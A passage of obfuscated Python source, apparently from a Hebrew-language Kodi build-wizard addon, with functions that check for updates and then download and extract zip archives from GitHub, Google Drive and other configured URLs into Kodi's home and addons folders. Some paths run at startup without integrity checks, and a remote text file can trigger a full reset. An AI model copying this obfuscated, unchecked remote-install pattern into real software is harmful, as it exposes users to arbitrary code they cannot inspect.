	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5188
def checkUpdate ():#line:5190
	O00OO0000OOOOOO0O =wiz .getS ('disableupdate')#line:5191
	O0O000O0O0O0OO000 =wiz .getS ('buildname')#line:5192
	O00OOO00OO0OOOOO0 =wiz .getS ('buildversion')#line:5193
	O0OO0O00O0O0O0O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5194
	O00OOOOOO000OO000 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0O000O0O0O0OO000 ).findall (O0OO0O00O0O0O0O0O )#line:5195
	if len (O00OOOOOO000OO000 )>0 :#line:5196
		OO00OO00O0O000OO0 =O00OOOOOO000OO000 [0 ][0 ]#line:5197
		O0O0000OOO000O00O =O00OOOOOO000OO000 [0 ][1 ]#line:5198
		O00O00OOOOOO0O00O =O00OOOOOO000OO000 [0 ][2 ]#line:5199
		wiz .setS ('latestversion',OO00OO00O0O000OO0 )#line:5200
		if OO00OO00O0O000OO0 >O00OOO00OO0OOOOO0 :#line:5201
			if O00OO0000OOOOOO0O =='false':#line:5202
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O00OOO00OO0OOOOO0 ,OO00OO00O0O000OO0 ),xbmc .LOGNOTICE )#line:5203
				notify .updateWindow (O0O000O0O0O0OO000 ,O00OOO00OO0OOOOO0 ,OO00OO00O0O000OO0 ,O0O0000OOO000O00O ,O00O00OOOOOO0O00O )#line:5204
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O00OOO00OO0OOOOO0 ,OO00OO00O0O000OO0 ),xbmc .LOGNOTICE )#line:5205
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O00OOO00OO0OOOOO0 ,OO00OO00O0O000OO0 ),xbmc .LOGNOTICE )#line:5206
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5207
def updatetelemedia (OO00OO0OOO0000000 ):#line:5208
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5209
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5210
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5211
    wiz .wizardUpdate ('startup')#line:5212
    checkUpdate ()#line:5214
    time .sleep (15.0 )#line:5216
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5217
        OO0OO0OOOO0OOO0OO =(ADDON .getSetting ("autoupdate"))#line:5218
        STARTP2 ()#line:5219
        if not NOTIFY =='true':#line:5220
            O0OOOOO00O0O0OOO0 =wiz .workingURL (NOTIFICATION )#line:5221
            if O0OOOOO00O0O0OOO0 ==True :#line:5222
                OO000OO000O000O0O ,OOO0OO00O0OOO0O00 =wiz .splitNotify (NOTIFICATION )#line:5223
                if not OO000OO000O000O0O ==False :#line:5224
                    try :#line:5225
                        OO000OO000O000O0O =int (OO000OO000O000O0O );OO00OO0OOO0000000 =int (OO00OO0OOO0000000 )#line:5226
                        if OO000OO000O000O0O ==OO00OO0OOO0000000 :#line:5227
                            if NOTEDISMISS =='false':#line:5228
                                debridit .debridIt ('update','all')#line:5229
                                traktit .traktIt ('update','all')#line:5230
                                checkidupdatetele ()#line:5231
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO000OO000O000O0O ),xbmc .LOGNOTICE )#line:5232
                        elif OO000OO000O000O0O >OO00OO0OOO0000000 :#line:5233
                            wiz .log ("[Notifications] id: %s"%str (OO000OO000O000O0O ),xbmc .LOGNOTICE )#line:5234
                            wiz .setS ('noteid',str (OO000OO000O000O0O ))#line:5235
                            wiz .setS ('notedismiss','false')#line:5236
                            if OO0OO0OOOO0OOO0OO =='true':#line:5237
                                debridit .debridIt ('update','all')#line:5238
                                traktit .traktIt ('update','all')#line:5239
                                checkidupdatetele ()#line:5240
                            else :notify .notification (msg =OOO0OO00O0OOO0O00 )#line:5241
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5242
                    except Exception as OO00O0O0OO00O000O :#line:5243
                        wiz .log ("Error on Notifications Window: %s"%str (OO00O0O0OO00O000O ),xbmc .LOGERROR )#line:5244
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5245
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OOOOO00O0O0OOO0 ),xbmc .LOGNOTICE )#line:5246
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5247
def checkidupdate ():#line:5251
				wiz .setS ("notedismiss","true")#line:5253
				OOO0O0OO0OOOOOO00 =wiz .workingURL (NOTIFICATION )#line:5254
				O0000OOO0OOOO000O =" Kodi Premium"#line:5256
				O00OOOOOOO0OOO0O0 =wiz .checkBuild (O0000OOO0OOOO000O ,'gui')#line:5257
				O0O0O0000O00O000O =O0000OOO0OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5258
				if not wiz .workingURL (O00OOOOOOO0OOO0O0 )==True :return #line:5259
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5260
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000OOO0OOOO000O ),'','אנא המתן')#line:5261
				O0O0O0OOO000O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0O0000O00O000O )#line:5262
				try :os .remove (O0O0O0OOO000O000O )#line:5263
				except :pass #line:5264
				logging .warning (O00OOOOOOO0OOO0O0 )#line:5265
				if 'google'in O00OOOOOOO0OOO0O0 :#line:5266
				   O0O000000OO00OO00 =googledrive_download (O00OOOOOOO0OOO0O0 ,O0O0O0OOO000O000O ,DP ,wiz .checkBuild (O0000OOO0OOOO000O ,'filesize'))#line:5267
				else :#line:5270
				  downloader .download (O00OOOOOOO0OOO0O0 ,O0O0O0OOO000O000O ,DP )#line:5271
				xbmc .sleep (100 )#line:5272
				OO00O00O0OOOO00O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OOO0OOOO000O )#line:5273
				DP .update (0 ,OO00O00O0OOOO00O0 ,'','אנא המתן')#line:5274
				extract .all (O0O0O0OOO000O000O ,HOME ,DP ,title =OO00O00O0OOOO00O0 )#line:5275
				DP .close ()#line:5276
				wiz .defaultSkin ()#line:5277
				wiz .lookandFeelData ('save')#line:5278
				if KODIV >=18 :#line:5279
					skindialogsettind18 ()#line:5280
				if INSTALLMETHOD ==1 :O00O0O00OOOOO0O00 =1 #line:5283
				elif INSTALLMETHOD ==2 :O00O0O00OOOOO0O00 =0 #line:5284
				else :DP .close ()#line:5285
def checkidupdatetele ():#line:5286
				wiz .setS ("notedismiss","true")#line:5288
				OO0000OO0OOO0O00O =wiz .workingURL (NOTIFICATION )#line:5289
				O00O00O000O0OO0OO =" Kodi Premium"#line:5291
				OO0O0O0O00O0OOOOO =wiz .checkBuild (O00O00O000O0OO0OO ,'gui')#line:5292
				OOO000OO000000OO0 =O00O00O000O0OO0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5293
				if not wiz .workingURL (OO0O0O0O00O0OOOOO )==True :return #line:5294
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5295
				O0O00O0000O00000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO000OO000000OO0 )#line:5298
				try :os .remove (O0O00O0000O00000O )#line:5299
				except :pass #line:5300
				if 'google'in OO0O0O0O00O0OOOOO :#line:5302
				   OO0O0000OOOO00O00 =googledrive_download (OO0O0O0O00O0OOOOO ,O0O00O0000O00000O ,DP2 ,wiz .checkBuild (O00O00O000O0OO0OO ,'filesize'))#line:5303
				else :#line:5306
				  downloaderbg .download3 (OO0O0O0O00O0OOOOO ,O0O00O0000O00000O ,DP2 )#line:5307
				xbmc .sleep (100 )#line:5308
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5309
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5311
				extract .all2 (O0O00O0000O00000O ,HOME ,DP2 )#line:5313
				DP2 .close ()#line:5314
				wiz .defaultSkin ()#line:5315
				wiz .lookandFeelData ('save')#line:5316
				wiz .kodi17Fix ()#line:5317
				if KODIV >=18 :#line:5318
					skindialogsettind18 ()#line:5319
				debridit .debridIt ('restore','all')#line:5324
				traktit .traktIt ('restore','all')#line:5325
				if INSTALLMETHOD ==1 :OO00OO000OO00OO0O =1 #line:5326
				elif INSTALLMETHOD ==2 :OO00OO000OO00OO0O =0 #line:5327
				else :DP2 .close ()#line:5328
				OOO0OO0O0OOOO0OO0 =(NOTIFICATION2 )#line:5329
				OO0000OO00OO00O0O =urllib2 .urlopen (OOO0OO0O0OOOO0OO0 )#line:5330
				O00O0O0OOO0O000O0 =OO0000OO00OO00O0O .readlines ()#line:5331
				OOO0O000O0O0O00OO =0 #line:5332
				for OO00OOOOO00OOOOOO in O00O0O0OOO0O000O0 :#line:5335
					if OO00OOOOO00OOOOOO .split (' ==')[0 ]=="noreset"or OO00OOOOO00OOOOOO .split ()[0 ]=="noreset":#line:5336
						xbmc .executebuiltin ("ReloadSkin()")#line:5338
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5339
						OO000O0O0OO0O0OOO =(ADDON .getSetting ("message"))#line:5340
						if OO000O0O0OO0O0OOO =='true':#line:5341
							infobuild ()#line:5342
						update_Votes ()#line:5343
						indicatorfastupdate ()#line:5344
					if OO00OOOOO00OOOOOO .split (' ==')[0 ]=="reset"or OO00OOOOO00OOOOOO .split ()[0 ]=="reset":#line:5345
						update_Votes ()#line:5347
						indicatorfastupdate ()#line:5348
						resetkodi ()#line:5349
def gaiaserenaddon ():#line:5350
  O0000OO0O0O0OOO0O =(ADDON .getSetting ("gaiaseren"))#line:5351
  O00O0OOOOO000O000 =(ADDON .getSetting ("auto_rd"))#line:5352
  if O0000OO0O0O0OOO0O =='true'and O00O0OOOOO000O000 =='true':#line:5353
    OOO0O00O0OOO0OO00 =(NEWFASTUPDATE )#line:5354
    O00000OO0O00000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5355
    O00OOOO0000OO0000 =xbmcgui .DialogProgress ()#line:5356
    O00OOOO0000OO0000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5357
    OO0O00000000OOOOO =os .path .join (PACKAGES ,'isr.zip')#line:5358
    OO0OOOO00O00OOOOO =urllib2 .Request (OOO0O00O0OOO0OO00 )#line:5359
    OOOO00OO0OO0OO00O =urllib2 .urlopen (OO0OOOO00O00OOOOO )#line:5360
    OOOOO0O0OO00OO00O =xbmcgui .DialogProgress ()#line:5362
    OOOOO0O0OO00OO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5363
    OOOOO0O0OO00OO00O .update (0 )#line:5364
    O0O00OO0000OOO0O0 =open (OO0O00000000OOOOO ,'wb')#line:5366
    try :#line:5368
      O0000O000OOOO00OO =OOOO00OO0OO0OO00O .info ().getheader ('Content-Length').strip ()#line:5369
      OOOO000O00OO00O00 =True #line:5370
    except AttributeError :#line:5371
          OOOO000O00OO00O00 =False #line:5372
    if OOOO000O00OO00O00 :#line:5374
          O0000O000OOOO00OO =int (O0000O000OOOO00OO )#line:5375
    O00000000OO00O000 =0 #line:5377
    O00OOO000OO000OOO =time .time ()#line:5378
    while True :#line:5379
          O00O00O0O00O0OOOO =OOOO00OO0OO0OO00O .read (8192 )#line:5380
          if not O00O00O0O00O0OOOO :#line:5381
              sys .stdout .write ('\n')#line:5382
              break #line:5383
          O00000000OO00O000 +=len (O00O00O0O00O0OOOO )#line:5385
          O0O00OO0000OOO0O0 .write (O00O00O0O00O0OOOO )#line:5386
          if not OOOO000O00OO00O00 :#line:5388
              O0000O000OOOO00OO =O00000000OO00O000 #line:5389
          if OOOOO0O0OO00OO00O .iscanceled ():#line:5390
             OOOOO0O0OO00OO00O .close ()#line:5391
             try :#line:5392
              os .remove (OO0O00000000OOOOO )#line:5393
             except :#line:5394
              pass #line:5395
             break #line:5396
          O0O0OOOO0O0OO0O0O =float (O00000000OO00O000 )/O0000O000OOOO00OO #line:5397
          O0O0OOOO0O0OO0O0O =round (O0O0OOOO0O0OO0O0O *100 ,2 )#line:5398
          OO0O00OO00O0OO00O =O00000000OO00O000 /(1024 *1024 )#line:5399
          OO0O000O0O0O0OO00 =O0000O000OOOO00OO /(1024 *1024 )#line:5400
          OO0OO0O0OOO0O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O00OO00O0OO00O ,'teal',OO0O000O0O0O0OO00 )#line:5401
          if (time .time ()-O00OOO000OO000OOO )>0 :#line:5402
            O0O0000OO0OO0000O =O00000000OO00O000 /(time .time ()-O00OOO000OO000OOO )#line:5403
            O0O0000OO0OO0000O =O0O0000OO0OO0000O /1024 #line:5404
          else :#line:5405
           O0O0000OO0OO0000O =0 #line:5406
          OO0OO00O00O0OO000 ='KB'#line:5407
          if O0O0000OO0OO0000O >=1024 :#line:5408
             O0O0000OO0OO0000O =O0O0000OO0OO0000O /1024 #line:5409
             OO0OO00O00O0OO000 ='MB'#line:5410
          if O0O0000OO0OO0000O >0 and not O0O0OOOO0O0OO0O0O ==100 :#line:5411
              O0OOO00O000OOO0O0 =(O0000O000OOOO00OO -O00000000OO00O000 )/O0O0000OO0OO0000O #line:5412
          else :#line:5413
              O0OOO00O000OOO0O0 =0 #line:5414
          OOOOO00O00O0O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0000OO0OO0000O ,OO0OO00O00O0OO000 )#line:5415
          OOOOO0O0OO00OO00O .update (int (O0O0OOOO0O0OO0O0O ),OO0OO0O0OOO0O0O00 ,OOOOO00O00O0O0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5417
    OO0OOO000000OOO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5420
    O0O00OO0000OOO0O0 .close ()#line:5423
    extract .all (OO0O00000000OOOOO ,OO0OOO000000OOO0O ,OOOOO0O0OO00OO00O )#line:5424
    try :#line:5428
      os .remove (OO0O00000000OOOOO )#line:5429
    except :#line:5430
      pass #line:5431
def iptvsimpldownpc ():#line:5432
    OO0OOO00O0O0O0O0O =(IPTVSIMPL18PC )#line:5434
    O0OOO0OOO0OO0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5435
    O0O0OO00O00000OOO =xbmcgui .DialogProgress ()#line:5436
    O0O0OO00O00000OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5437
    O00O00OOOO00O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5438
    OO00OOO0O00O0O00O =urllib2 .Request (OO0OOO00O0O0O0O0O )#line:5439
    O0O0O0O0000OO00OO =urllib2 .urlopen (OO00OOO0O00O0O00O )#line:5440
    OO0OOOO0O00000OOO =xbmcgui .DialogProgress ()#line:5442
    OO0OOOO0O00000OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5443
    OO0OOOO0O00000OOO .update (0 )#line:5444
    O0000OO000OO000OO =open (O00O00OOOO00O00O0 ,'wb')#line:5446
    try :#line:5448
      O0OOOOOOOOO0OO0O0 =O0O0O0O0000OO00OO .info ().getheader ('Content-Length').strip ()#line:5449
      O0000O0OO000OOO00 =True #line:5450
    except AttributeError :#line:5451
          O0000O0OO000OOO00 =False #line:5452
    if O0000O0OO000OOO00 :#line:5454
          O0OOOOOOOOO0OO0O0 =int (O0OOOOOOOOO0OO0O0 )#line:5455
    OO000000OOO0OO00O =0 #line:5457
    OO0OO0O0OOOOOO000 =time .time ()#line:5458
    while True :#line:5459
          OOO0O0OO0O0000OO0 =O0O0O0O0000OO00OO .read (8192 )#line:5460
          if not OOO0O0OO0O0000OO0 :#line:5461
              sys .stdout .write ('\n')#line:5462
              break #line:5463
          OO000000OOO0OO00O +=len (OOO0O0OO0O0000OO0 )#line:5465
          O0000OO000OO000OO .write (OOO0O0OO0O0000OO0 )#line:5466
          if not O0000O0OO000OOO00 :#line:5468
              O0OOOOOOOOO0OO0O0 =OO000000OOO0OO00O #line:5469
          if OO0OOOO0O00000OOO .iscanceled ():#line:5470
             OO0OOOO0O00000OOO .close ()#line:5471
             try :#line:5472
              os .remove (O00O00OOOO00O00O0 )#line:5473
             except :#line:5474
              pass #line:5475
             break #line:5476
          O0OOO000O000O000O =float (OO000000OOO0OO00O )/O0OOOOOOOOO0OO0O0 #line:5477
          O0OOO000O000O000O =round (O0OOO000O000O000O *100 ,2 )#line:5478
          OOOOO00O00OO0O0O0 =OO000000OOO0OO00O /(1024 *1024 )#line:5479
          OO000O0OO000OOO0O =O0OOOOOOOOO0OO0O0 /(1024 *1024 )#line:5480
          OOO00O000OOOO000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO00O00OO0O0O0 ,'teal',OO000O0OO000OOO0O )#line:5481
          if (time .time ()-OO0OO0O0OOOOOO000 )>0 :#line:5482
            O000O0O0O0O0OO000 =OO000000OOO0OO00O /(time .time ()-OO0OO0O0OOOOOO000 )#line:5483
            O000O0O0O0O0OO000 =O000O0O0O0O0OO000 /1024 #line:5484
          else :#line:5485
           O000O0O0O0O0OO000 =0 #line:5486
          OOO00OO0000O0O00O ='KB'#line:5487
          if O000O0O0O0O0OO000 >=1024 :#line:5488
             O000O0O0O0O0OO000 =O000O0O0O0O0OO000 /1024 #line:5489
             OOO00OO0000O0O00O ='MB'#line:5490
          if O000O0O0O0O0OO000 >0 and not O0OOO000O000O000O ==100 :#line:5491
              OO0000000OOOOOO0O =(O0OOOOOOOOO0OO0O0 -OO000000OOO0OO00O )/O000O0O0O0O0OO000 #line:5492
          else :#line:5493
              OO0000000OOOOOO0O =0 #line:5494
          O00O0000OOOO0O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000O0O0O0O0OO000 ,OOO00OO0000O0O00O )#line:5495
          OO0OOOO0O00000OOO .update (int (O0OOO000O000O000O ),OOO00O000OOOO000O ,O00O0000OOOO0O000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5497
    OO0OOO0000O0OOO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5500
    O0000OO000OO000OO .close ()#line:5503
    extract .all (O00O00OOOO00O00O0 ,OO0OOO0000O0OOO0O ,OO0OOOO0O00000OOO )#line:5504
    try :#line:5508
      os .remove (O00O00OOOO00O00O0 )#line:5509
    except :#line:5510
      pass #line:5511
def iptvkodi18idan ():#line:5512
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5514
              OO0OOO0OO0000O0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5517
              O00OOO0OO00O0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5518
              O0OO0000000OO00O0 =xbmcgui .DialogProgress ()#line:5519
              O0OO0000000OO00O0 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5520
              O0O0O0O0O0O0OOO00 =os .path .join (O00OOO0OO00O0000O ,'isr.zip')#line:5521
              O00OO00O0O0OOOO00 =urllib2 .Request (OO0OOO0OO0000O0OO )#line:5522
              OO00O0000OO0OOO0O =urllib2 .urlopen (O00OO00O0O0OOOO00 )#line:5523
              O00O0O0OO0OOO0O00 =xbmcgui .DialogProgress ()#line:5525
              O00O0O0OO0OOO0O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5526
              O00O0O0OO0OOO0O00 .update (0 )#line:5527
              O0O000O000O00O0OO =open (O0O0O0O0O0O0OOO00 ,'wb')#line:5529
              try :#line:5531
                OO0OO0OOOOO00OOOO =OO00O0000OO0OOO0O .info ().getheader ('Content-Length').strip ()#line:5532
                OO0O0OO0O0OOO0O0O =True #line:5533
              except AttributeError :#line:5534
                    OO0O0OO0O0OOO0O0O =False #line:5535
              if OO0O0OO0O0OOO0O0O :#line:5537
                    OO0OO0OOOOO00OOOO =int (OO0OO0OOOOO00OOOO )#line:5538
              OO000O0O000O0OOO0 =0 #line:5540
              OOOO0000000OO00O0 =time .time ()#line:5541
              while True :#line:5542
                    O00OOOO0000O0O0O0 =OO00O0000OO0OOO0O .read (8192 )#line:5543
                    if not O00OOOO0000O0O0O0 :#line:5544
                        sys .stdout .write ('\n')#line:5545
                        break #line:5546
                    OO000O0O000O0OOO0 +=len (O00OOOO0000O0O0O0 )#line:5548
                    O0O000O000O00O0OO .write (O00OOOO0000O0O0O0 )#line:5549
                    if not OO0O0OO0O0OOO0O0O :#line:5551
                        OO0OO0OOOOO00OOOO =OO000O0O000O0OOO0 #line:5552
                    if O00O0O0OO0OOO0O00 .iscanceled ():#line:5553
                       O00O0O0OO0OOO0O00 .close ()#line:5554
                       try :#line:5555
                        os .remove (O0O0O0O0O0O0OOO00 )#line:5556
                       except :#line:5557
                        pass #line:5558
                       break #line:5559
                    OOO00OOOO0O0OO0OO =float (OO000O0O000O0OOO0 )/OO0OO0OOOOO00OOOO #line:5560
                    OOO00OOOO0O0OO0OO =round (OOO00OOOO0O0OO0OO *100 ,2 )#line:5561
                    O0OOO00O0OO000OO0 =OO000O0O000O0OOO0 /(1024 *1024 )#line:5562
                    O0OO0OOOOOOO0OOO0 =OO0OO0OOOOO00OOOO /(1024 *1024 )#line:5563
                    OOO0OOO0000O00OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO00O0OO000OO0 ,'teal',O0OO0OOOOOOO0OOO0 )#line:5564
                    if (time .time ()-OOOO0000000OO00O0 )>0 :#line:5565
                      O0OOOOOOO000O0OOO =OO000O0O000O0OOO0 /(time .time ()-OOOO0000000OO00O0 )#line:5566
                      O0OOOOOOO000O0OOO =O0OOOOOOO000O0OOO /1024 #line:5567
                    else :#line:5568
                     O0OOOOOOO000O0OOO =0 #line:5569
                    OOOO00OOOOOOOO00O ='KB'#line:5570
                    if O0OOOOOOO000O0OOO >=1024 :#line:5571
                       O0OOOOOOO000O0OOO =O0OOOOOOO000O0OOO /1024 #line:5572
                       OOOO00OOOOOOOO00O ='MB'#line:5573
                    if O0OOOOOOO000O0OOO >0 and not OOO00OOOO0O0OO0OO ==100 :#line:5574
                        OOOO0O0OO0OO00000 =(OO0OO0OOOOO00OOOO -OO000O0O000O0OOO0 )/O0OOOOOOO000O0OOO #line:5575
                    else :#line:5576
                        OOOO0O0OO0OO00000 =0 #line:5577
                    OOO000O0OOOOOOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOOOOO000O0OOO ,OOOO00OOOOOOOO00O )#line:5578
                    O00O0O0OO0OOO0O00 .update (int (OOO00OOOO0O0OO0OO ),"Downloading "+'iptv',OOO0OOO0000O00OO0 ,OOO000O0OOOOOOOOO )#line:5580
              O000000O0O0OOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5583
              O0O000O000O00O0OO .close ()#line:5586
              extract .all (O0O0O0O0O0O0OOO00 ,O000000O0O0OOOOO0 ,O00O0O0OO0OOO0O00 )#line:5587
              try :#line:5590
                os .remove (O0O0O0O0O0O0OOO00 )#line:5591
              except :#line:5593
                pass #line:5594
              O00O0O0OO0OOO0O00 .close ()#line:5595
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5598
              OO0OOO0OO0000O0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5600
              O00OOO0OO00O0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5601
              O0OO0000000OO00O0 =xbmcgui .DialogProgress ()#line:5602
              O0OO0000000OO00O0 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5603
              O0O0O0O0O0O0OOO00 =os .path .join (O00OOO0OO00O0000O ,'isr.zip')#line:5604
              O00OO00O0O0OOOO00 =urllib2 .Request (OO0OOO0OO0000O0OO )#line:5605
              OO00O0000OO0OOO0O =urllib2 .urlopen (O00OO00O0O0OOOO00 )#line:5606
              O00O0O0OO0OOO0O00 =xbmcgui .DialogProgress ()#line:5608
              O00O0O0OO0OOO0O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5609
              O00O0O0OO0OOO0O00 .update (0 )#line:5610
              O0O000O000O00O0OO =open (O0O0O0O0O0O0OOO00 ,'wb')#line:5612
              try :#line:5614
                OO0OO0OOOOO00OOOO =OO00O0000OO0OOO0O .info ().getheader ('Content-Length').strip ()#line:5615
                OO0O0OO0O0OOO0O0O =True #line:5616
              except AttributeError :#line:5617
                    OO0O0OO0O0OOO0O0O =False #line:5618
              if OO0O0OO0O0OOO0O0O :#line:5620
                    OO0OO0OOOOO00OOOO =int (OO0OO0OOOOO00OOOO )#line:5621
              OO000O0O000O0OOO0 =0 #line:5623
              OOOO0000000OO00O0 =time .time ()#line:5624
              while True :#line:5625
                    O00OOOO0000O0O0O0 =OO00O0000OO0OOO0O .read (8192 )#line:5626
                    if not O00OOOO0000O0O0O0 :#line:5627
                        sys .stdout .write ('\n')#line:5628
                        break #line:5629
                    OO000O0O000O0OOO0 +=len (O00OOOO0000O0O0O0 )#line:5631
                    O0O000O000O00O0OO .write (O00OOOO0000O0O0O0 )#line:5632
                    if not OO0O0OO0O0OOO0O0O :#line:5634
                        OO0OO0OOOOO00OOOO =OO000O0O000O0OOO0 #line:5635
                    if O00O0O0OO0OOO0O00 .iscanceled ():#line:5636
                       O00O0O0OO0OOO0O00 .close ()#line:5637
                       try :#line:5638
                        os .remove (O0O0O0O0O0O0OOO00 )#line:5639
                       except :#line:5640
                        pass #line:5641
                       break #line:5642
                    OOO00OOOO0O0OO0OO =float (OO000O0O000O0OOO0 )/OO0OO0OOOOO00OOOO #line:5643
                    OOO00OOOO0O0OO0OO =round (OOO00OOOO0O0OO0OO *100 ,2 )#line:5644
                    O0OOO00O0OO000OO0 =OO000O0O000O0OOO0 /(1024 *1024 )#line:5645
                    O0OO0OOOOOOO0OOO0 =OO0OO0OOOOO00OOOO /(1024 *1024 )#line:5646
                    OOO0OOO0000O00OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO00O0OO000OO0 ,'teal',O0OO0OOOOOOO0OOO0 )#line:5647
                    if (time .time ()-OOOO0000000OO00O0 )>0 :#line:5648
                      O0OOOOOOO000O0OOO =OO000O0O000O0OOO0 /(time .time ()-OOOO0000000OO00O0 )#line:5649
                      O0OOOOOOO000O0OOO =O0OOOOOOO000O0OOO /1024 #line:5650
                    else :#line:5651
                     O0OOOOOOO000O0OOO =0 #line:5652
                    OOOO00OOOOOOOO00O ='KB'#line:5653
                    if O0OOOOOOO000O0OOO >=1024 :#line:5654
                       O0OOOOOOO000O0OOO =O0OOOOOOO000O0OOO /1024 #line:5655
                       OOOO00OOOOOOOO00O ='MB'#line:5656
                    if O0OOOOOOO000O0OOO >0 and not OOO00OOOO0O0OO0OO ==100 :#line:5657
                        OOOO0O0OO0OO00000 =(OO0OO0OOOOO00OOOO -OO000O0O000O0OOO0 )/O0OOOOOOO000O0OOO #line:5658
                    else :#line:5659
                        OOOO0O0OO0OO00000 =0 #line:5660
                    OOO000O0OOOOOOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOOOOO000O0OOO ,OOOO00OOOOOOOO00O )#line:5661
                    O00O0O0OO0OOO0O00 .update (int (OOO00OOOO0O0OO0OO ),"Downloading "+'iptv',OOO0OOO0000O00OO0 ,OOO000O0OOOOOOOOO )#line:5663
              O000000O0O0OOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5666
              O0O000O000O00O0OO .close ()#line:5669
              extract .all (O0O0O0O0O0O0OOO00 ,O000000O0O0OOOOO0 ,O00O0O0OO0OOO0O00 )#line:5670
              try :#line:5671
                os .remove (O0O0O0O0O0O0OOO00 )#line:5672
              except :#line:5674
                pass #line:5675
              O00O0O0OO0OOO0O00 .close ()#line:5676
def iptvkodi17_18 ():#line:5677
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:5680
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5681
